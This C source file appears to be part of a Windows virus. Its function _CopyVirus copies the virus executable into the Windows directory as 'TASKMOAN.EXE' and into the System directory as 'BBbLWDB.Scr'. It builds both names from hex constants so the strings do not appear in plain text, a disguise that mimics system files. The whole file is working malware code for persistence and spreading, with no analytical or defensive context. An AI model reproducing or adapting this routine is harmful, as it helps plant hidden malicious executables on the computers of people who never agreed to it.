#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _CopyVirus(void)
{
    volatile struct _LocalCtx {
        char windir[256];
        char windir2[256];
        char windoze[271];
        char windoze2[271];
        char sysdir[256];
        char sysdir2[256];
        char sysdoze[271];
        char sysdoze2[271];
        int len_windoze;
        int len_windoze2;
        int len_sysdoze;
        int len_sysdoze2;
    } ctx;

    GetWindowsDirectoryA(ctx.windir, sizeof(ctx.windir));
    GetWindowsDirectoryA(ctx.windir2, sizeof(ctx.windir2));

    strcpy(ctx.windoze, ctx.windir);
    ctx.len_windoze = strlen(ctx.windoze);

    *(uint32_t *)(ctx.windoze + ctx.len_windoze) = 0x5341545c;
    *(uint32_t *)(ctx.windoze + ctx.len_windoze + 4) = 0x414f4d4b;
    *(uint32_t *)(ctx.windoze + ctx.len_windoze + 8) = 0x58452e4e;
    *((uint16_t *)(ctx.windoze + ctx.len_windoze + 12)) = 0x45;

    strcpy(ctx.windoze2, ctx.windir2);
    ctx.len_windoze2 = strlen(ctx.windoze2);

    *(uint32_t *)(ctx.windoze2 + ctx.len_windoze2) = 0x5341545c;
    *(uint32_t *)(ctx.windoze2 + ctx.len_windoze2 + 4) = 0x414f4d4b;
    *(uint32_t *)(ctx.windoze2 + ctx.len_windoze2 + 8) = 0x58452e4e;
    *((uint16_t *)(ctx.windoze2 + ctx.len_windoze2 + 12)) = 0x45;

    CopyFileA(_VirusPath, ctx.windoze, 0);

    GetSystemDirectoryA(ctx.sysdir, sizeof(ctx.sysdir));
    GetSystemDirectoryA(ctx.sysdir2, sizeof(ctx.sysdir2));

    strcpy(ctx.sysdoze, ctx.sysdir);
    ctx.len_sysdoze = strlen(ctx.sysdoze);

    *(uint32_t *)(ctx.sysdoze + ctx.len_sysdoze) = 0x6242425c;
    *(uint32_t *)(ctx.sysdoze + ctx.len_sysdoze + 4) = 0x4244574c;
    *(uint32_t *)(ctx.sysdoze + ctx.len_sysdoze + 8) = 0x7263532e;
    *((char *)(ctx.sysdoze + ctx.len_sysdoze + 12)) = 0;

    strcpy(ctx.sysdoze2, ctx.sysdir2);
    ctx.len_sysdoze2 = strlen(ctx.sysdoze2);

    *(uint32_t *)(ctx.sysdoze2 + ctx.len_sysdoze2) = 0x6242425c;
    *(uint32_t *)(ctx.sysdoze2 + ctx.len_sysdoze2 + 4) = 0x4244574c;
    *(uint32_t *)(ctx.sysdoze2 + ctx.len_sysdoze2 + 8) = 0x7263532e;
    *((char *)(ctx.sysdoze2 + ctx.len_sysdoze2 + 12)) = 0;

    CopyFileA(_VirusPath, ctx.sysdoze, 0);
}
#pragma optimize("", on)
